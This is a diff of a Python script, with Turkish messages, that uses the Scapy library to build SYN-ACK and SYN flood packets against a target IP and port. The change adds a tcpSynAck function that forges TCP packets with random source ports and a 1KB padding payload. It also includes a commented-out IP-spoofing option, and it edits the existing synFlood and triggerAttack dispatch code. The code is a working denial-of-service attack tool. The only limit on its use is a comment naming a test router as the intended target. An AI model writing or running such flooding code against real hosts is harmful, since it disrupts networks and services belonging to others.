@@ -2,9 +2,13 @@ from scapy.all import *
 import socket
 import ipaddress
 
+target_ip = ""
+target_port = 0
 input_ip=""
+
 def triggerAttack(attackName, input_ipOrDns, input_port):
     global input_ip
+    input_ip=""
     if input_ipOrDns.startswith("http") or input_ipOrDns.endswith("/"):
         # eğer http ile başlıyorsa http veya https'yi temizle
         input_ipOrDns = input_ipOrDns.replace(
@@ -27,7 +31,6 @@ def triggerAttack(attackName, input_ipOrDns, input_port):
         if input_ip =="":
             print("SYN Flood saldırısı yapılamadı!")
         else:
-            print("aa"+input_ip)
             synFlood(input_ip, input_port)
         
     else:
@@ -51,11 +54,39 @@ def is_valid_ip_address(ip_address):
 
 
 
-def tcpSynAck(input_ip, input_port):
+def tcpSynAck(ip, port):
+    global target_ip
+    global target_port
     print("TcpSynAck yapılıyor.")
+
+    try:
+        # target IP address (should be a testing router/firewall)
+        target_ip = ip
+        # the target port u want to flood
+        target_port = port
+        # forge IP packet with target ip as the destination IP address
+        ip = IP(dst=target_ip)
+        # or if you want to perform IP Spoofing (will work as well)
+        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+        # forge a TCP SYN packet with a random source port
+        # and the target port as the destination port
+        tcp = TCP(sport=RandShort(), dport=target_port, flags="SA")
+        # add some flooding data (1KB in this case)
+        raw = Raw(b"X"*1024)
+        # stack up the layers
+        p = ip / tcp / raw
+        # send the constructed packet in a loop until CTRL+C is detected
+        print("yollanıyor")
+        send(p,verbose=0)
+    except Exception as e:
+        print("tcpSynAck saldırısı yapılamadı!")
+        print(str(e))
+
 
 
 def synFlood(ip, port):
+    global target_ip
+    global target_port
     try:
         # target IP address (should be a testing router/firewall)
         target_ip = ip
@@ -78,4 +109,6 @@ def synFlood(ip, port):
     except Exception as e:
         print("SynFlood saldırısı yapılamadı!")
         print(str(e))
+
+
 
